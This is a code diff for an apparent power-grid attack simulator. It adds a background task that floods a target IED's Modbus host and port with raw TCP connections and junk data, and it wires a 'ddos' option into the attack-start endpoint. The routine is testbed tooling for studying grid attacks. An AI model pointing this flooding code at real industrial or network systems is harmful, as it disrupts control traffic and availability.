@@ -45,6 +45,47 @@ async def execute_fdia_overvoltage(ied_id: str, voltage_pu: float, attack_id: st
     except asyncio.CancelledError:
         logger.info(f"[*] FDIA Task {attack_id} cancelled cleanly.")
 
+async def execute_ddos(ied_id: str, attack_id: str):
+    """
+    Background worker that floods the target IED with junk TCP connections
+    to simulate a DoS attack, causing legitimate Modbus queries to queue and RTT to spike.
+    """
+    from main import sim_engine
+    import socket
+    logger.info(f"[*] Starting DDoS Task {attack_id} on {ied_id}")
+    
+    connections = []
+    try:
+        while True:
+            if sim_engine.is_running and ied_id in sim_engine.modbus.clients:
+                client = sim_engine.modbus.clients[ied_id]
+                host = client.comm_params.host
+                port = client.comm_params.port
+                
+                # Flood with raw TCP sockets
+                for _ in range(20): 
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.setblocking(False)
+                        s.connect_ex((host, port))
+                        s.sendall(b"GARBAGE_DATA_1234\n")
+                        connections.append(s)
+                    except Exception:
+                        pass
+                
+                # Prevent crashing our own OS by rotating sockets
+                if len(connections) > 300:
+                    for s in connections[:100]:
+                        try: s.close()
+                        except: pass
+                    connections = connections[100:]
+                    
+            await asyncio.sleep(0.01) # heavy spam
+    except asyncio.CancelledError:
+        for s in connections:
+            try: s.close()
+            except: pass
+        logger.info(f"[*] DDoS Task {attack_id} cancelled.")
 
 @router.post("/attack/start")
 async def start_attack(cmd: AttackCommand):
@@ -85,18 +126,16 @@ async def start_attack(cmd: AttackCommand):
     if cmd.attack_type == "fdia_overvoltage":
         v_pu = cmd.params.get("injected_value", 1.20) if cmd.params else 1.20
         task = asyncio.create_task(execute_fdia_overvoltage(cmd.target_ied, v_pu, cmd.attack_id))
-        active_attacks[cmd.attack_id] = {
-            "task": task,
-            "start_time": time.time(),
-            "details": cmd
-        }
+    elif cmd.attack_type == "ddos":
+        task = asyncio.create_task(execute_ddos(cmd.target_ied, cmd.attack_id))
     else:
-        # Dummy attack / DDoS or just logic bombing (tag it, but no active native payload here)
-        active_attacks[cmd.attack_id] = {
-            "task": None,
-            "start_time": time.time(),
-            "details": cmd
-        }
+        task = None
+        
+    active_attacks[cmd.attack_id] = {
+        "task": task,
+        "start_time": time.time(),
+        "details": cmd
+    }
 
     return {"status": "started", "attack_id": cmd.attack_id}
 
